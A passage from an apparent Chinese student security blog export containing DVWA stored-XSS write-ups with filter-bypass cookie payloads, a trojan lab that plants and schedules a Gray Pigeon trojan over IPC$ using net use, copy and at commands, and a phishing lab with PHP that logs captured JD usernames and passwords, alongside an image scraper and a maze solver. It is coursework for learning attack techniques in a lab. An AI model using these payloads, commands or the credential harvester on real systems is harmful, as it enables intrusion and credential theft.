<p>先代码审计，执行一个正则表达式的搜索和替换,其中 <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> 是正则表达式 <code>(.*)</code> 表示贪婪匹配，<code>/i</code> 表示不区分大小写所以在High级别的代码中，所有关于  <code>&lt;script&gt;</code> 标签均被过滤删除了 ,可以使用其他的标签。</p>
<p>构造payload：</p>
<div class="hljs"><pre><code class="hljs routeros">&lt;IMG <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;</code></pre></div>

<p><img src="https://i.loli.net/2020/11/05/tzosymv7d1Sru3e.png" srcset="/img/loading.gif" alt="xssmid.png"></p>
<h2 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS (Stored)"></a>XSS (Stored)</h2><h3 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'btnSign'</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    $message = trim( $_POST[ <span class="hljs-string">'mtxMessage'</span> ] );
    $name    = trim( $_POST[ <span class="hljs-string">'txtName'</span> ] );

    <span class="hljs-comment">// Sanitize message input</span>
    $message = stripslashes( $message );
    $message = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));

    <span class="hljs-comment">// Sanitize name input</span>
    $name = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));

    <span class="hljs-comment">// Update database</span>
    $query  = <span class="hljs-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;
    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );

    <span class="hljs-comment">//mysql_close();</span>
&#125;

<span class="hljs-meta">?&gt;</span></code></pre></div>

<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p> <code>isset()</code> 函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false </p>
<p> <code>trim()</code> 函数作用为移除字符串两侧空白字符或其他预定义字符 </p>
<p> <code>stripslashes()</code> 函数用于删除字符串中的反斜杠 </p>
<p> <code>mysqli_real_escape_string()</code> 函数会对字符串中的特殊号<code>(\x00，\n，\r，\，&#39;，&quot;，\x1a)</code> 进行转义 </p>
<p> 在代码中对message，name输入框内容  没有进行XSS方面的过滤和检查 </p>
<p> 且通过  <code>query</code> 语句插入到数据库中。所以存在存储型XSS漏洞 </p>
<p>这里name ,message的输入框中都存在xss，所以两个位置都可以使用，但是name位置有字数限制，可以使用bp抓包修改</p>
<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026203331497.png" srcset="/img/loading.gif" alt="image-20201026203331497"></p>
<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026203255791.png" srcset="/img/loading.gif" alt="image-202010262032"></p>
<p>由于是存储型XSS,所以每次刷新页面都会弹出cookie。</p>
<h3 id="medium-4"><a href="#medium-4" class="headerlink" title="medium"></a>medium</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'btnSign'</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    $message = trim( $_POST[ <span class="hljs-string">'mtxMessage'</span> ] );
    $name    = trim( $_POST[ <span class="hljs-string">'txtName'</span> ] );

    <span class="hljs-comment">// Sanitize message input</span>
    $message = strip_tags( addslashes( $message ) );
    $message = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
    $message = htmlspecialchars( $message );

    <span class="hljs-comment">// Sanitize name input</span>
    $name = str_replace( <span class="hljs-string">'&lt;script&gt;'</span>, <span class="hljs-string">''</span>, $name );
    $name = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));

    <span class="hljs-comment">// Update database</span>
    $query  = <span class="hljs-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;
    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );

    <span class="hljs-comment">//mysql_close();</span>
&#125;

<span class="hljs-meta">?&gt;</span></code></pre></div>

<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><div class="hljs"><pre><code class="hljs php">$message = strip_tags( addslashes( $message ) );
$message = htmlspecialchars( $message );
$name = str_replace( <span class="hljs-string">'&lt;script&gt;'</span>, <span class="hljs-string">''</span>, $name );</code></pre></div>

<p> <code>strip_tags()</code> 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 <code>&lt;b&gt;</code> 标签。 </p>
<p> <code>addslashes()</code> 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 </p>
<p> <code>htmlspecialchars()</code> 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 </p>
<p> 对message输入内容进行检测过滤，因此无法再通过message参数注入XSS代码</p>
<p>但是对于name参数，只是简单过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型的XSS，与反射型中级的一样的方法</p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs django"><span class="xml">使用双写绕过，输入  <span class="hljs-tag">&lt;<span class="hljs-name">scr</span>&lt;<span class="hljs-attr">script</span>&gt;</span>ipt&gt;alert(document.cookie)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> </span>
<span class="xml">使用大小写绕过，输入<span class="hljs-tag">&lt;<span class="hljs-name">sCript</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> </span>
<span class="xml">输入其他标签，如  <span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span></span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/05/CIUt6lTadZ5fEig.png" srcset="/img/loading.gif" alt="xssstored2.png"></p>
<h3 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'btnSign'</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    $message = trim( $_POST[ <span class="hljs-string">'mtxMessage'</span> ] );
    $name    = trim( $_POST[ <span class="hljs-string">'txtName'</span> ] );

    <span class="hljs-comment">// Sanitize message input</span>
    $message = strip_tags( addslashes( $message ) );
    $message = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
    $message = htmlspecialchars( $message );

    <span class="hljs-comment">// Sanitize name input</span>
    $name = preg_replace( <span class="hljs-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="hljs-string">''</span>, $name );
    $name = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));

    <span class="hljs-comment">// Update database</span>
    $query  = <span class="hljs-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;
    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );

    <span class="hljs-comment">//mysql_close();</span>
&#125;

<span class="hljs-meta">?&gt;</span></code></pre></div>

<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><div class="hljs"><pre><code class="hljs php">$message = strip_tags( addslashes( $message ) );
$message = htmlspecialchars( $message );
$name = preg_replace( <span class="hljs-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="hljs-string">''</span>, $name );</code></pre></div>

<p> <code>strip_tags()</code> 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 <code>&lt;b&gt;</code> 标签。 </p>
<p> <code>addslashes()</code> 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 </p>
<p> <code>htmlspecialchars()</code> 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 </p>
<p>name,执行一个正则表达式的搜索和替换,其中 <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> 是正则表达式 <code>(.*)</code> 表示贪婪匹配，<code>/i</code> 表示不区分大小写所以在High级别的代码中，所有关于  <code>&lt;script&gt;</code> 标签均被过滤删除了 ,可以使用其他的标签。</p>
<p>只能换一个标签</p>
<div class="hljs"><pre><code class="hljs routeros">&lt;IMG <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;</code></pre></div>



]]></content>
      <categories>
        <category>网安作业</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>xss</tag>
        <tag>blind sql</tag>
      </tags>
  </entry>
  <entry>
    <title>爬图</title>
    <url>/2020/07/18/%E7%88%AC%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="用爬虫爬取小姐姐的图片"><a href="#用爬虫爬取小姐姐的图片" class="headerlink" title="用爬虫爬取小姐姐的图片"></a>用爬虫爬取小姐姐的图片</h1><a id="more"></a>
<p><strong>用的库</strong></p>
<div class="hljs"><pre><code class="hljs applescript">re <span class="hljs-comment">#正则表达式</span>
requests <span class="hljs-comment">#url请求</span>
<span class="hljs-built_in">time</span>   <span class="hljs-comment">#时间</span>
os     <span class="hljs-comment">#用于创建文件夹，保存图片</span></code></pre></div>
<p>##准备工作<br>1.首先访问该链接<br><code>https://www.vmgirls.com/</code><br>2.随便点击一个进入查看详情<br><code>https://www.vmgirls.com/13344.html</code><br>3.F12审查元素网查看页详情，主要查看图片链接的标签位置，写出正则表达式<br><img src="https://i.loli.net/2020/12/04/49X1BbloChqFsic.png" srcset="/img/loading.gif" alt="1"><br>该正则表达式为<code>findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39;</code></p>
<h2 id="完整程序"><a href="#完整程序" class="headerlink" title="完整程序"></a>完整程序</h2><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/7/16 13:36</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : tupian.py</span>
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> os

dir = <span class="hljs-string">"plmm"</span>        <span class="hljs-comment">#文件夹名字</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(dir):   <span class="hljs-comment">#首先判断是否存在当前文件夹如果没有则创建一个</span>
    os.mkdir(dir)
<span class="hljs-comment"># 模仿浏览器的首部信息，绕过一些网站的反爬取措施</span>
head = &#123;
        <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61"</span>
    &#125;

url = <span class="hljs-string">"https://www.vmgirls.com/13344.html"</span>
response = requests.get(url, headers = head)   <span class="hljs-comment"># 访问目标网页，获取网页内容</span>
html = response.text

findlinks = <span class="hljs-string">'&lt;a href="(.*?)" alt=".*?" title=".*?"&gt;'</span>
urls = re.findall(findlinks, html)   <span class="hljs-comment">#爬取到的图片链接保存在urls中， 是一个列表</span>

<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:
    time.sleep(<span class="hljs-number">1</span>)    <span class="hljs-comment">#防止访问速度过快使服务器崩溃</span>
    file_name = url.split(<span class="hljs-string">'/'</span>)[<span class="hljs-number">-1</span>]    <span class="hljs-comment">#保存图片的名字</span>

    res = requests.get(url, headers = head)   <span class="hljs-comment">#依此访问图片链接</span>
    <span class="hljs-keyword">with</span> open(dir+<span class="hljs-string">'/'</span>+file_name, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:   <span class="hljs-comment">#以二进制形式保存图片</span>
        f.write(res.content)</code></pre></div>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>迷宫问题</title>
    <url>/2020/03/20/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h1><a id="more"></a>

<h2 id="原题"><a href="#原题" class="headerlink" title="原题"></a>原题</h2><p>题目描述</p>
<p>小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。<br> 小明只能向上下左右四个方向移动。</p>
<p>输入</p>
<p>输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。<br> 每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。<br> 接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。<br> 字符的含义如下：<br>‘S’：起点<br>‘E’：终点<br>‘-’：空地，可以通过<br>‘#’：障碍，无法通过<br> 输入数据保证有且仅有一个起点和终点。</p>
<p>输出</p>
<p>对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。</p>
<h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code>1
5 5
s-###
-----
##---
E#---
---##</code></pre></div><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code>9</code></pre></div><h2 id="解决代码"><a href="#解决代码" class="headerlink" title="解决代码"></a>解决代码</h2><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;queue&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> de[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<span class="hljs-comment">//计步数组  记录走到这个位置所需的步数 不能走到的位置标记为-1 </span>
<span class="hljs-keyword">char</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];  <span class="hljs-comment">//用于存放迷宫地图 </span>
<span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-keyword">int</span>,intP;  <span class="hljs-comment">//坐标</span>
<span class="hljs-keyword">int</span> to[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;  <span class="hljs-comment">//在当前坐标下能走的四个方向</span>
<span class="hljs-keyword">int</span> sx,ex,sy,ey;  <span class="hljs-comment">//(sx,sy)为起点坐标  （ex,ey）为终点坐标</span>
<span class="hljs-keyword">int</span> x,y,nx,ny; <span class="hljs-comment">//(x,y)为函数中当前位置坐标   （nx,ny)为接下来能到达的坐标 </span>
<span class="hljs-keyword">int</span> r,l;  <span class="hljs-comment">//r为行数 l为列数 </span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bfs</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">memset</span>(de,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span>(de));
	<span class="hljs-built_in">queue</span>&lt;Pqu;
	qu.push(P(sx,sy));   //将起点坐标放入队头 
	de[sx][sy]=0;
	<span class="hljs-keyword">while</span>(!qu.empty()) 
	&#123;
		P p=qu.front();   //取出队头坐标 
		qu.pop() ;//删除对头及走过的坐标 
		x=p.first,y=p.second; 
		<span class="hljs-keyword">if</span>(x==ex&amp;&amp;y==ey) <span class="hljs-keyword">break</span>; //到达终点 跳出循环		
	 	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=0;i&lt;4;i++)
		&#123;
			nx=x+to[0][i];//开始向四个方向移动 
			ny=y+to[1][i];			
				<span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span>&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;l&amp;&amp;<span class="hljs-built_in">map</span>[nx][ny]!=<span class="hljs-string">'#'</span>&amp;&amp;de[nx][ny]==<span class="hljs-number">-1</span>)
	 <span class="hljs-comment">//判断是否越界 以及是否能走  排除走过的路 </span>
	 &#123;
	 	 qu.push(P(nx,ny));  <span class="hljs-comment">//将能走的坐标放入队列 之后依次删除 </span>
						 de[nx][ny]=de[x][y]+<span class="hljs-number">1</span>;  <span class="hljs-comment">//步数加一 </span>
					  &#125; 				  
			&#125;
	&#125;
	<span class="hljs-keyword">if</span>(de[ex][ey]==<span class="hljs-number">-1</span>)  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">//终点的记步数组为-1 及不能到达终点 </span>
	<span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> de[ex][ey]; 
&#125; 
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">int</span> n,i,j;
	<span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n)&#123;
		<span class="hljs-keyword">while</span>(n--)&#123;
			<span class="hljs-built_in">cin</span>&gt;&gt;r&gt;&gt;l;
			<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;r;i++)&#123;
				<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;l;j++)&#123; 
				<span class="hljs-built_in">cin</span>&gt;&gt;<span class="hljs-built_in">map</span>[i][j];
				<span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">'S'</span>) <span class="hljs-comment">//记录起点坐标 </span>
				 &#123;
					sx=i,sy=j;
				 &#125; 
				 <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">'E'</span>)  <span class="hljs-comment">//记录终点坐标 </span>
				 &#123;
				 	ex=i,ey=j;
				 &#125;
				&#125;
			&#125;
			<span class="hljs-built_in">cout</span>&lt;&lt;bfs()&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>bfs</tag>
      </tags>
  </entry>
  <entry>
    <title>木马</title>
    <url>/2020/07/18/%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="初识木马"><a href="#初识木马" class="headerlink" title="初识木马"></a>初识木马</h1><a id="more"></a>
<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p><strong>使用灰鸽子软件以及端口爆破软件控制目的主机</strong></p>
<p>准备一台xp，一台2003<br>其中xp地址为10.1.1.3/24 2003为10.1.1.1/24<br>使两个主机能够通信<br>xp作为攻击方，2003为受害者</p>
<h3 id="1-制作木马"><a href="#1-制作木马" class="headerlink" title="1.制作木马"></a>1.制作木马</h3><p>使用灰鸽子制作木马，将木马生成在在桌面（记住路径之后要使用）<br><img src="https://i.loli.net/2020/11/30/xci7NTtIXgeODkz.png" srcset="/img/loading.gif" alt><br><img src="https://i.loli.net/2020/11/30/H38gByNiumIE1t7.png" srcset="/img/loading.gif" alt></p>
<h3 id="2-扫描主机，并对账号密码进行爆破"><a href="#2-扫描主机，并对账号密码进行爆破" class="headerlink" title="2.扫描主机，并对账号密码进行爆破"></a>2.扫描主机，并对账号密码进行爆破</h3><p>ip起始地址为10.1.1.1-10.1.1.255<br>密码配置文件<br><img src="https://i.loli.net/2020/11/30/8gSyYGJxjvqTaDR.png" srcset="/img/loading.gif" alt><br>其实只要扫描10.1.1.1即可（因为是实验）</p>
<p>获取账号密码<br>username：administrator<br>password: “”</p>
<h3 id="3-与目标主机建立IPC"><a href="#3-与目标主机建立IPC" class="headerlink" title="3.与目标主机建立IPC$"></a>3.与目标主机建立IPC$</h3><p><code>net use \\10.1.1.1\ipc$ &quot;&quot; \user:administrator</code></p>
<h3 id="4-植入木马到目标主机"><a href="#4-植入木马到目标主机" class="headerlink" title="4.植入木马到目标主机"></a>4.植入木马到目标主机</h3><p><code>copy C:\Documents and Settings\shimisi\桌面\qq.exe  \\10.1.1.1\ipc$</code></p>
<h3 id="5-设置目标主机运行木马"><a href="#5-设置目标主机运行木马" class="headerlink" title="5.设置目标主机运行木马"></a>5.设置目标主机运行木马</h3><p><code>net time \\10.1.1.1</code>根据目标主机时间设置事物的开始时间<br><code>at \\10.1.1.1 17:17 c:\qq.exe</code>在上面的时间之后三分钟左右设置一个事物<br>即在17：17时运行木马文件</p>
<h3 id="6-成功控制目标主机"><a href="#6-成功控制目标主机" class="headerlink" title="6.成功控制目标主机"></a>6.成功控制目标主机</h3><p>观察目标主机已自动上线，已可以进行监控或传输数据等操作</p>
<p>获取屏幕内容<br><img src="https://i.loli.net/2020/11/30/1Mow9ZpJxznAFRS.png" srcset="/img/loading.gif" alt></p>
<p>控制命令行<br><img src="https://i.loli.net/2020/11/30/nKMgSveqLyYr4aJ.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>木马</category>
      </categories>
  </entry>
  <entry>
    <title>diaoyu</title>
    <url>/2020/07/18/diaoyu/</url>
    <content><![CDATA[<h1 id="DNS欺骗、ARP攻击及钓鱼网站制作"><a href="#DNS欺骗、ARP攻击及钓鱼网站制作" class="headerlink" title="DNS欺骗、ARP攻击及钓鱼网站制作"></a>DNS欺骗、ARP攻击及钓鱼网站制作</h1><a id="more"></a>
<p>1.实验目的<br>获取登录jd网页的用户名和密码<br>2.实验主机<br>一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者<br>3.实验材料<br>京东登录网页及其所有图片（浏览器访问<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F" target="_blank" rel="noopener">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> 之后保存网页即可）<br><img src="https://i.loli.net/2020/11/30/LOSJIsP4luKBQxA.png" srcset="/img/loading.gif" alt><br>修改index.html中的内容<br><img src="https://i.loli.net/2020/11/30/jyiqQNSlnEt43XL.png" srcset="/img/loading.gif" alt><br>error.php中的内容如下<br>关键代码（用于保存用户名和密码以及迷惑用户）</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$nam = stripslashes($_POST[<span class="hljs-string">'name'</span>]); <span class="hljs-comment">//name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要</span>
$pas = stripslashes($_POST[<span class="hljs-string">'pass'</span>]);<span class="hljs-comment">//pass也一样</span>
$content = <span class="hljs-string">"您已捕获京东账号及密码1个："</span> . <span class="hljs-string">" 用户名 "</span> . $nam . <span class="hljs-string">" 密码 "</span> . $pas;   <span class="hljs-comment">//保存捕获的用户名和密码</span>
$filed = @fopen(<span class="hljs-string">"1.txt"</span>, <span class="hljs-string">"a+"</span>);   <span class="hljs-comment">//打开1.txt</span>
@fwrite($filed, <span class="hljs-string">"$content\n"</span>);     <span class="hljs-comment">//将用户名和密码写入1.txt</span>
<span class="hljs-meta">?&gt;</span>
&lt;html&gt;
&lt;head&gt;
&lt;script type=<span class="hljs-string">"text/javascript"</span>&gt;
		<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goBack</span><span class="hljs-params">()</span></span>
<span class="hljs-function">		</span>&#123;
			window.history.back() <span class="hljs-comment">//后退+刷新</span>
		&#125;
&lt;/script&gt;
&lt;/head&gt;
&lt;body onload=<span class="hljs-string">"goBack()"</span>&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre></div>
<p>4.实验拓扑图<br><img src="/2020/07/18/diaoyu/tuopu.png" srcset="/img/loading.gif" alt></p>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="一-部署京东的服务器"><a href="#一-部署京东的服务器" class="headerlink" title="一.部署京东的服务器"></a>一.部署京东的服务器</h3><p>1.安装DNS和web服务器（具体步骤略）<br>2.配置DNS服务器<br>a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）<br>b.在jd域中新建一台主机  <a href="http://www.jd.com" target="_blank" rel="noopener">www.jd.com</a>    ip:10.1.1.1</p>
